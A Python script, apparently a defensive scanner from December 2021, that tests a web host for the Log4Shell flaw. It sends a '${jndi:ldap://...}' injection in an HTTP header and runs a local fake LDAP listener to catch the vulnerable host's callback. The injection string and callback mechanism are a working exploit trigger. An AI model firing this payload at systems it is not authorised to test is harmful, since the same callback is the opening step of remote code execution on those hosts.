#!/usr/bin/env python3
#------------------------------------------------------------------------------
# log4sh-detect.py
#
# Tests the Specified Host for the log4shell Vulnerability.
#
# NOTE(s):
#
#   * Morty and Morty's Creations ASSUMES ZERO LIABILITY relating to the
#     results obtained by this script.
#
#   * The exploit *REQUIRES* that the host being exploited can connect BACK
#     to a "rogue" server for further command.
#
#   * The protocol used to trigger an outbound connection on the exploited
#     host is IRRELEVANT (besides a WAF Blocking Action which may hit ONLY
#     a SPECIFIC protocol).
#
#   * The host being used to run the (this) Detection Program MUST BE ABLE
#     TO BIND to the port sent within the exploit.
#
#       - This means that firewall (and / or Malware Apps) on the host running
#         this script needs access to open a Listening Port.
#
#       - Attempting to run this script OVER THE INTERNET will require the
#         host running this script to either be FULLY INTERNET FACING or have
#         a Port Map from the Externally-Facing IP / Port to the host
#         running this script.
#
# Morty
# Copyright (c) 2021 by Morty's Creations - 2021-12-14
#------------------------------------------------------------------------------
# IMPORTS
#------------------------------------------------------------------------------
from    pprint                      import      (pprint, pformat)
from    datetime                    import      (datetime)
from    threading                   import      (Thread, Event)
import  getopt
import  os
import  random
import  requests
import  select
import  signal
import  socket
import  string
import  struct
import  sys
import  time
import  urllib3
#------------------------------------------------------------------------------
_                       = [
  pprint,
  pformat,
  time
]
#------------------------------------------------------------------------------
PROGRAM                 = os.path.basename(sys.argv[0])
VERSION                 = "1.2"
REVISION                = "20211214-0"
AUTHOR                  = "Morty (Morty's Creations"
#------------------------------------------------------------------------------
# GLOBALS / CONSTANTS
#------------------------------------------------------------------------------
#------------------------------------------------------------------------------
NETWORK_DIR_LABELS      = {
  "Receive"             : " <-- ",
  "Send"                : " --> ",
}
#------------------------------------------------------------------------------
def DATETIME_STRING()   :
  return(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
#------------------------------------------------------------------------------
WANT_EXCEPTIONS         = False
#------------------------------------------------------------------------------
LEN_RAND_DATA           = 30
#------------------------------------------------------------------------------
PORT_EXPLOIT_CB_DEF     = 1389
#------------------------------------------------------------------------------
HEADER_NAME_EXPLOIT     = "X-Api-Version"
#------------------------------------------------------------------------------
TIMEOUT_EXPLOIT_CB      = 10.0
#------------------------------------------------------------------------------
TIMEOUT_SOCKET_SELECT   = 2.0
#------------------------------------------------------------------------------
#------------------------------------------------------------------------------
LDAP_BIND_SUCCESS       = (
    b"\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00")
#------------------------------------------------------------------------------
#------------------------------------------------------------------------------
g_debug                 = False
g_resultOnly            = False
g_evtAppExit            = Event()
#------------------------------------------------------------------------------
g_tcpThread             = None
#------------------------------------------------------------------------------
#------------------------------------------------------------------------------

class TCPThread(Thread):

  #----------------------------------------------------------------------------

  def __init__(
        self,
        addr            = None,
        port            = 1389,
        timeout         = TIMEOUT_EXPLOIT_CB,
        searchString    = None):
  
    Thread.__init__(self)
    
    self._addr          = (addr or TCPThread.getPrimaryIP())
    self._port          = port
    
    self._socket        = None
    self._evtTerm       = Event()
    
    self._timeout       = (timeout * 1000)
    self._searchString  = searchString
    
    self._result        = False
    
    self._clients       = {}

  #----------------------------------------------------------------------------
  
  def begin(self):
  
    debug("TCPThread: begin()")
    
    ret = None
    
    try:
      self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      self._socket.setblocking(0)
      if(self._socket is not None):
        self._port = self.bindToPort(self._port)
        if(self._port is not None):
          self._socket.listen(1)
          self.start()
          ret = self._port
    except:
      self._socket  = None
      ret           = None
      if(WANT_EXCEPTIONS): raise

    return(ret)

  #----------------------------------------------------------------------------
  
  @staticmethod
  def socketShutdown(sock):
  
    ret = False
    
    #addr = ":".join(sock.get("raddr", ""))
    addr = TCPThread.getSocketInfo(sock)
    
    try:
      sock.setsockopt(socket.SOL_SOCKET,
            socket.SO_LINGER,
            struct.pack('ii', 1, 0))
      debug("TCPThread::socketClose [socket = %s]: socket.shutdown()..." %
            (addr))
      sock.shutdown(socket.SHUT_RDWR)
      debug("TCPThread::socketClose [socket = %s]: socket.close()..." %
            (addr))
      sock.close()
      ret = True
    except Exception as e:
      debug("TCPThread::socketClose - EXCEPTION [socket = %s]: %s" %
            (addr, str(e)))
      if(WANT_EXCEPTIONS): raise

    debug("TCPThread::socketClose [socket = %s]: cleanup Complete: %s" %
            (addr, str(ret)))

    return(ret)  
  
  #----------------------------------------------------------------------------
    
  def cancel(self):
  
    debug("TCPThread::cancel BEGIN")
    
    if(self._evtTerm is not None):
      self._evtTerm.set()

  #----------------------------------------------------------------------------
  
  def getResult(self):
  
    return(self._result)
  
  #----------------------------------------------------------------------------

  def run(self):
  
    # The Socket Server uses NON-BLOCKING Sockets (via select()) so that we
    # can (gracefully) terminate as needed.
    
    # This function is long and messy, and can probably be modularized for
    # neater code, but my goal was to encapsulate this into a SINGLE SCRIPT,
    # so leaving it as-is for now!
    
    debug("TCPThread::run() BEGIN")

    sockList    = [self._socket]
    
    msStart     = time.time() * 1000
    
    while (not self._evtTerm.is_set()):
    
      # debug("About to Wait for Socket select()...")
      (rr, rw, err) = select.select(sockList,
            sockList,
            sockList,
            TIMEOUT_SOCKET_SELECT)
      # debug("Socket select() Complete:\n  rr  = %d\n  rw  = %d\n  err = %d" %
      #      (len(rr), len(rw), len(err)))
      for rs in rr:
        # READABLE SOCKETS:
        if(rs == self._socket):
          # READABLE LISTENER (SERVER) SOCKET:
          debug("Server Socket")
          (conn, addr) = rs.accept()
          self._clients[conn] = {
            "state"     : "init",
            "addr"      : ("%s:%d" % (addr[0], addr[1])),
            "conn"      : conn,
          }
          debug("Received Connection on Port %d from %s:%d" % (
                self._port, addr[0], addr[1]))
          conn.setblocking(0)
          sockList.append(conn)
        else:
          # READABLE CLIENT SOCKET
          client = self._clients.get(rs, None)
          if(client is not None):
            data        = rs.recv(1024)
            dataAscii   = TCPThread.decodeToAscii(data)
            if(data):
              TCPThread.hexdump(data, rs, "Receive")
              if(client["state"] == "init"):
                client["state"] = "ldap_bind_request_received"
              elif(client["state"] == "ldap_bind_success_sent"):
                if(self._searchString is not None):
                  if(self._searchString in dataAscii):
                    self._result = True
                    debug("TCPThread/run(): Search String Found: %s" %
                            (self._searchString))
                    break
            else:
              debug("Connection Closed: %s" % (client["addr"]))
              sockList.remove(rs)

      for ws in rw:
        # WRITABLE SOCKETS
        client = self._clients.get(ws, None)
        if(client is not None):
          if(client["state"] == "ldap_bind_request_received"):
            ws.send(LDAP_BIND_SUCCESS)
            debug("Sent LDAP Bind Success to Client: %s" % (client["addr"]))
            client["state"] = "ldap_bind_success_sent"
          elif(client["state"] == "ldap_bind_success_sent"):
            pass
      
      for es in err:
        # ERROR SOCKET
        client = self._clients.get(es, None)
        if(client is not None):
          debug("Socket Error: %s" % (client["addr"]))
          es.close()
          del self._clients[es]
          sockList.remove(es)
      
      if(self._result):
        debug("TCPThread.run(): Search String Found; Exiting Thread...")
        break
      elif(((time.time() * 1000) - msStart) >= self._timeout):
        debug("TCPThread.run(): Timeout Reached [%d]; Exiting Thread..." %
                (self._timeout))
        break  

    sockList.reverse()
    for sock in sockList:
      if(sock is not None):
        TCPThread.socketShutdown(sock)
        sockList.remove(sock)

    debug("TCPThread::run() COMPLETE")          
      

  #----------------------------------------------------------------------------
    
  def bindToPort(self, port = None):

    ret  = None
    
    if(self._socket is not None):
      if(port is None):
        for port in range(10000, 32767):
          try:
            self._socket.bind((self._addr, port))
            debug("Socket Bound to %s:%d..." % (self._addr, port))
            ret = port
            break
          except:
            pass
      else:
        try:
          self._socket.bind((self._addr, port))
          debug("Socket Bound to %s:%d..." % (self._addr, port))
          ret = port
        except:
          if(WANT_EXCEPTIONS): raise
    
    return(ret)
    
  #----------------------------------------------------------------------------
  
  @staticmethod
  def getSocketInfo(sock, separator = " "):
  
    ret = "[not_connected]"
    
    try:
      ret = ("%s:%d%s%s:%d" % (
            *sock.getsockname(),
            separator,
            *sock.getpeername()))
    except:
      ret = "[not_connected]"
    
    return(ret)
  
  #----------------------------------------------------------------------------

  @staticmethod
  def decodeToAscii(data):
  
    ret = None
    
    if(type(data) is bytes):
      try:
        ret  = data.decode("iso-8859-1")
      except:
        ret  = None
        if(WANT_EXCEPTIONS): raise
    
    return(ret)

  #----------------------------------------------------------------------------

  @staticmethod
  def hexdump(dataIn, sock:socket, action = "Receive"):

    data = None
    
    if(type(dataIn) is bytes):
      try:
        data = TCPThread.decodeToAscii(dataIn)
      except Exception as e:
        _     = e
        data  = None
        if(WANT_EXCEPTIONS): raise
    else:
      data = dataIn
    
    """
0000   00 01 02 03 04 05 06 07  08 09 10 11 12 13 14 15   ........ ........
YYYY-MM-DD HH:MM:SS 255.255.255.255:32767 --> 255.255.255.255:32767
    """
    
    if(data is None):
      return
      
    offset = 0

    debug("\n%-19s  %-47s  %d bytes" % (
            DATETIME_STRING(),
            TCPThread.getSocketInfo(sock,
                    NETWORK_DIR_LABELS.get(action, " ")),
            len(data)))

    while (len(data) > 0):
      endIdx = (15 if(len(data) >= 16) else len(data))
      line   = data[0:endIdx]
      strHex = ""
      strAsc = ""
      for bi in range(0, len(line)):
        if((bi > 0) and (bi % 8 == 0)):
          strHex += " "
          strAsc += " "
        strHex += (" %02x" % (ord(line[bi])))
        if((ord(data[bi]) >= ord(' ')) and (ord(line[bi]) <= ord('~'))):
          strAsc += chr(ord(line[bi]))
        else:
          strAsc += "."
      debug("%-04s   %-48s   %s" % (
            ("{:04x}".format(offset)),
            strHex,
            strAsc))
      if(endIdx < 15):
        break
      else:
        data = data[16:]
      offset += len(line)
    
    debug("")
  
  #----------------------------------------------------------------------------
  
  @staticmethod
  def getPrimaryIP():
  
    ret = None
    
    try:
      hn = socket.gethostname()
      if(hn is not None):
        ret = socket.gethostbyname(hn)
    except:
      ret = None
      if(WANT_EXCEPTIONS): raise
    
    return(ret)
  
  #----------------------------------------------------------------------------
  #----------------------------------------------------------------------------
  #----------------------------------------------------------------------------
  
    

#------------------------------------------------------------------------------
#------------------------------------------------------------------------------

def usage():

  print("\n%s v%s Rev%s\n%s\n" % (PROGRAM, VERSION, REVISION, AUTHOR))
  print("Usage: %s [-erT] [-i|p|h|t <arg>] <url>" % (
        PROGRAM))

  print("""
OPTIONS:

  -h | --help                       this message
  url                               url to test for exploit
  -d | --debug                      enable debugging output
  -e | --exploit-only               send exploit request ONLY (NO RESULT)
  -r | --result-only                results only (no status)
  -i | --ip-callback    <ip>        ip for exploit callback
  -p | --port-callback  <port | a>  port for exploit callback (a* = auto)
  -H | --header         <hdr_name>  header name sent in exploit
  -t | --timeout        <timeout>   timeout for exploit in seconds
  -T | --skip-callback-test         skip reachability test [NOT RECOMMENDED!]

""")  

  print("""

NOTES / **DISCLAIMER**:

  * The exploit *REQUIRES* that the host being exploited can connect BACK
    to a "rogue" server for further command.

  * The protocol used to trigger an outbound connection on the exploited
    host is IRRELEVANT (besides a WAF Blocking Action which may hit ONLY
    a SPECIFIC protocol).

  * The host being used to run the (this) Detection Program MUST BE ABLE
    TO BIND to the port sent within the exploit.

      - This means that firewall (and / or Malware Apps) on the host running
        this script needs access to open a Listening Port.

      - Attempting to run this script OVER THE INTERNET will require the
        host running this script to either be FULLY INTERNET FACING or have
        a Port Map from the Externally-Facing IP / Port to the host
        running this script.

  * Morty and Morty's Creations ASSUMES ZERO LIABILITY relating to the
    results obtained by this script.
    
    ** USE AT YOUR OWN RISK **

""")

  exit(2)

#------------------------------------------------------------------------------

def debug(msg):

  if(g_debug):
    print(msg, file = sys.stderr)

#------------------------------------------------------------------------------

def quote(s):

  if(" " in s):
    if(len(s) > 0):
      if(s[0]  != "\""):  s = "\"" + s
      if(s[-1] != "\""):  s = s + "\""
  
  return(s)

#------------------------------------------------------------------------------

def printStatus(action, file = sys.stderr, **kwargs):

  if(not(g_resultOnly)):

    print("%s %s" % (DATETIME_STRING(), action), file = file)

    for k in kwargs:
      print("%-30s %s" % (k, str(kwargs[k])), file = file)
  
    print("", file = file)

#------------------------------------------------------------------------------

def errorexit(msg):

  print(msg, file = sys.stderr)
  exit(1)

#------------------------------------------------------------------------------

def signalHandler(signum, frame):

  global g_evtAppExit

  debug("signalHandler: Caught Signal %d..." % (signum))
  
  if(g_tcpThread is not None):
    g_tcpThread.cancel()

  if(g_evtAppExit is not None):
    g_evtAppExit.set()

#------------------------------------------------------------------------------

def exploitCBTestWarning():

  print("""
WARNING! WARNING! WARNING! Skip Callback Test Specified!

  * The Callback Test validates the return path to this test script!
  * If the Callback IP / Port is UNREACHABLE, RESULTS MAY BE INVALID!
  * [Morty certainly hopes you know what the heck you're doing!]
""")

#------------------------------------------------------------------------------

def exploitCBTest(exploitCBIP, exploitCBPort):

  ret   = False
  
  try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((exploitCBIP, exploitCBPort))
    sock.close()
    ret = True
  except:
    ret = False
  
  return(ret)

#------------------------------------------------------------------------------

def sendExploitedRequest(
        url,
        exploitHeaderName   = "X-Api-Version",
        exploitCBIP         = None,
        exploitCBPort       = 1389,
        exploitCBUserData   = None):

  try:
    urllib3.disable_warnings()
  except:
    pass

  # ${jndi:ldap://${LDAP_HOST}:${LDAP_PORT}/${LDAP_USERDATA}}

  ret       = { "succeeded": False, "status": -1 }
  
  headers   = {
    exploitHeaderName: ("${jndi:ldap://%s:%d/%s}" % (
            exploitCBIP,
            exploitCBPort,
            exploitCBUserData))
  }
  
  if("://" in url):
    (p, u) = url.split("://")
    protos = [p]
    url    = u
  else:
    protos = ["http", "https"]

  for proto in protos:
    try:
      response = requests.get(
            ("%s://%s" % (proto, url)),
            verify      = False,
            headers     = headers)
      ret["succeeded"]  = True
      ret["status"]     = response.status_code
      break
    except:
      ret["succeeded"]  = False
      if(WANT_EXCEPTIONS): raise
            
  return(ret)

#------------------------------------------------------------------------------

def main():

  ## Globals Modified in Function
  global g_tcpThread
  global g_debug
  global g_resultOnly
  
  ## Status Variables  
  retval            = 1
  cbOk              = None
  cbTestSkipped     = False

  ## Option Initialization
  exploitOnly       = False
  exploitHeaderName = HEADER_NAME_EXPLOIT
  exploitCBIP       = TCPThread.getPrimaryIP()
  exploitCBPort     = PORT_EXPLOIT_CB_DEF
  exploitCBUserData = None
  exploitCBTimeout  = TIMEOUT_EXPLOIT_CB

  ## Option Processing      BEGIN   ------------------------------------------
  for sig in [signal.SIGINT, signal.SIGTERM]:
    try:
      signal.signal(sig, signalHandler)
    except:
      print("WARNING: Failed to trap Signal %d" % (sig), file = sys.stderr)

  try:
    opts, args = getopt.getopt(sys.argv[1:], "hdeH:i:p:rT", \
            [
            "help",
            "debug",
            "ip-callback",
            "port-callback",
            "exploit-only",
            "header=",
            "result-only",
            "skip-callback-test"
            ])
  except getopt.GetoptError as err:
    _ = err       # Reserved for Future Use!
    usage()
  
  for o, a in opts:
    if o in ("-h", "--help"):
      usage()
    elif(o in ("-d", "--debug")):
      g_debug               = True
    elif(o in ("-e", "--exploit-only")):
      exploitOnly           = True
    elif(o in ("-H", "--header")):
      exploitHeaderName     = a
    elif(o in ("-i", "--ip-callback")):
      exploitCBIP           = a
    elif(o in ("-p", "--port-callback")):
      if(len(a) > 0):
        if(a.lower()[0] == "a"):
          exploitCBPort       = None
        else:
          try:
            exploitCBPort     = int(a)
          except ValueError:
            errorexit("Invalid Port Value: %s" % (a))
    elif(o in ("-r", "--result-only")):
      g_resultOnly          = True
    elif(o in ("-t", "--timeout-callback")):
      try:
        exploitCBTimeout    = int(a)
      except ValueError:
        errorexit("Invalid Callback Timeout Value: %s" % (a))
    elif(o in ("-T", "--skip-callback-test")):
      exploitCBTestWarning()
      cbOk                  = True
      cbTestSkipped         = True
    else:
      usage()

  if(len(args) < 1):
    usage()
  
  url = args[0]

  ## Option Processing      END     ------------------------------------------
  ## Test Setup             BEGIN   ------------------------------------------

  if(exploitCBUserData is None):
    exploitCBUserData = ("".join(random.choice(string.ascii_lowercase)
        for i in range(LEN_RAND_DATA)))
    debug("Random User Data String [len = %2d]: %s" %
            (len(exploitCBUserData), exploitCBUserData))

  if(not(exploitOnly)):
    try:
      g_tcpThread = TCPThread(
            timeout         = exploitCBTimeout,
            searchString    = exploitCBUserData,
            port            = exploitCBPort)
      exploitCBPort = g_tcpThread.begin()
      if(exploitCBPort is None):
        errorexit("Failed to bind local listener port; Fatal Error...")
      printStatus(
            "Local Callback Listener Opened",
            port            = str(exploitCBPort))
    except:
      errorexit("Failed to start TCP Thread; Exiting...")

  ## Test Setup             END     ------------------------------------------
  ## Test Validation        BEGIN   ------------------------------------------

    if(not(cbOk)):
      printStatus("Validating Callback IP / Port reachability...")
      cbOk = exploitCBTest(exploitCBIP, exploitCBPort)
      printStatus("Callback IP / Port reachability Test",
            exploitCBIP     = exploitCBIP,
            exploitCBPort   = exploitCBPort,
            status          = ("SUCCEEDED" if(cbOk) else "FAILED"))
      if(not(cbOk)):
        g_tcpThread.cancel()
        g_tcpThread.join()
        errorexit("Callback IP / Port Reachability Test FAILED; " +
                "Fatal Error...")

  ## Test Validation        END     ------------------------------------------
  ## Exploit Test           BEGIN   ------------------------------------------

  printStatus(
        "Sending Exploit HTTP Request",
        url                 = url)
  
  reqStatus = sendExploitedRequest(
        url,
        exploitHeaderName   = exploitHeaderName,
        exploitCBIP         = exploitCBIP,
        exploitCBPort       = exploitCBPort,
        exploitCBUserData   = exploitCBUserData)

  printStatus(
        "Exploit HTTP Request Sent",
        url                 = url,
        succeeded           = str(reqStatus["succeeded"]),
        http_status         = str(reqStatus["status"]))
  
  if(reqStatus.get("succeeded", False)):
  
    if(not(exploitOnly)):
      printStatus(
            "Wait for Exploited Host Callback",
            callbackIP      = exploitCBIP,
            callbackPort    = exploitCBPort,
            callbackTimeout = exploitCBTimeout)
      try:
        g_tcpThread.join()
        exploitSucceeded = g_tcpThread.getResult()
      except InterruptedError:
        pass
      
      if(not(g_evtAppExit.is_set())):
        print("%-40s [%s]" % (
                url,
                ("VULNERABLE" if(exploitSucceeded) else "not_vulnerable")))
      else:
        print("%-40s [%s]" % (
                url,
                "NO_RESULT_USER_CANCELLED"))

  if(cbTestSkipped): exploitCBTestWarning()

  ## Exploit Test           END     ------------------------------------------

  return(retval)

#------------------------------------------------------------------------------

if(__name__ == "__main__"):

  try:
    sys.exit(main())
  except KeyboardInterrupt:
    pass

#------------------------------------------------------------------------------
#------------------------------------------------------------------------------
#------------------------------------------------------------------------------
